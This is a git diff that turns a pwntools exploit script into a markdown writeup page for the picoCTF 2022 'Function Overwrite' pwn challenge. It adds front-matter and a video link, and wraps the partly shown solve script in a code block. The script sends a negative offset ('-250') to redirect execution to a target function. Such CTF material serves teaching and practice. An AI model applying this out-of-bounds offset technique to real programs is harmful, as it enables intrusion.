@@ -1,5 +1,31 @@
-from pwn import *
+---
+name: Function Overwrite (2022)
+event: Pico CTF 2022
+category: Pwn
+description: Writeup for Function Overwrite (Pwn) - Pico CTF (2022) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
+---
 
+# Function Overwrite
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=3883 "Pico CTF 2022: Function Overwrite")
+
+## Solution
+
+```py
+from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
@@ -9,7 +35,6 @@ def start(argv=[], *a, **kw):
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
-
 
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
@@ -40,3 +65,4 @@ io.sendline(b'-250')  # Offset to easy function
 # Got Shell?
 io.recvlines(2)
 info(io.recv().decode())
+```
